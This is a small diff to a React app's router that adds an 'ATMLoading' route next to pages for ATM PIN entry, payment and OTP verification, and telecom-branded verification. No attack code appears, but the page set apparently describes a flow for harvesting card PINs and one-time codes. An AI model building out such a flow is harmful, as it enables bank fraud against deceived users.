@@ -15,6 +15,7 @@ import RegistrationComplete from "./pages/RegistrationComplete";
 import PaymentOTP from "./pages/PaymentOTP";
 import OTPVerification from "./pages/OTPVerification";
 import ATMPin from "./pages/ATMPin";
+import ATMLoading from "./pages/ATMLoading";
 import Success from "./pages/Success";
 import OoreedooVerification from "./pages/OoreedooVerification";
 import ForgotPassword from "./pages/ForgotPassword";
@@ -64,6 +65,7 @@ const AppContent = () => {
       <Route path="/registration-complete" element={<RegistrationComplete />} />
       <Route path="/payment-otp" element={<PaymentOTP />} />
       <Route path="/atm-pin" element={<ATMPin />} />
+      <Route path="/atm-loading" element={<ATMLoading />} />
       <Route path="/ooredoo-verification" element={<OoreedooVerification />} />
       <Route path="/otp-verification" element={<OTPVerification />} />
       <Route path="/success" element={<Success />} />
